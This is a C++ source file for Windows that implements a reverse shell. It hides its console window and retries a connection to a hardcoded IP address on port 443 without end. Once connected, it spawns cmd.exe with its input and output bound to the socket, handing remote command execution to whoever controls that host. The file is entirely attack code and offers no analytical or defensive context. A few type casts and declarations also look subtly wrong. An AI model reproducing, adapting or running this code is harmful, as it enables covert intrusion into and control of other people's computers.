#include <Windows.h>
#include <WinSock2.h>
#include <WS2tcpip.h>
#include <stdio.h>
#pragma comment(lib, "Ws2_32.lib")

#define BUFLENGTH 1024

int wmain() {
	FreeConsole();
	LPCWSTR host = L"192.168.243.132";
	DWORD port = 443;

	while (true) {
		SOCKET sockone;
		sockaddr_in addressone;
		WSADATA wsa;
		WSAStartup(MAKEWORD(2, 2), &wsa);
		sockone = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, NULL, NULL);
		if (sockone == INVALID_SOCKET) {
			printf("Socket Failed");
		}
		addressone.sin_family = AF_INET;
		addressone.sin_port = htons(port);
		addressone.sin_addr.s_addr = inet_addr((char*)host);
		
		int WSAAPI wsaconnect = WSAConnect(sockone, (sockaddr*)&addressone, sizeof(addressone), NULL, NULL, NULL, NULL);
		if (wsaconnect == SOCKET_ERROR) {
			closesocket(sockone);
			WSACleanup();
			continue;
		}
		else {
			LPWSTR recvData[BUFLENGTH];
			memset(recvData, 0, sizeof(recvData));
			DWORD servResp = recv(sockone, (char*)recvData, BUFLENGTH, 0);

			if (servResp <= 0) {
				closesocket(sockone);
				WSACleanup();
				continue;
			}
			else {
				LPWSTR newProc[] = L"cmd.exe";
				STARTUPINFO startupinfo;
				PROCESS_INFORMATION processinfo;
				memset(&startupinfo, 0, sizeof(startupinfo));
				startupinfo.cb = sizeof(startupinfo);
				startupinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
				startupinfo.hStdInput = startupinfo.hStdOutput = startupinfo.hStdError = (HANDLE)sockone;

				BOOL createprocess = CreateProcessW(NULL, newProc, NULL, NULL, TRUE, 0, NULL, NULL, &startupinfo, &processinfo);
				WaitForSingleObject(processinfo.hProcess, INFINITE);
				CloseHandle(processinfo.hProcess);
				CloseHandle(processinfo.hThread);

				memset(recvData, 0, sizeof(recvData));
				int servCode = recv(sockone, (char*)recvData, BUFLENGTH, 0);
				if (servCode <= 0) {
					closesocket(sockone);
					WSACleanup();
					continue;
				}
			}
		}		
	}
}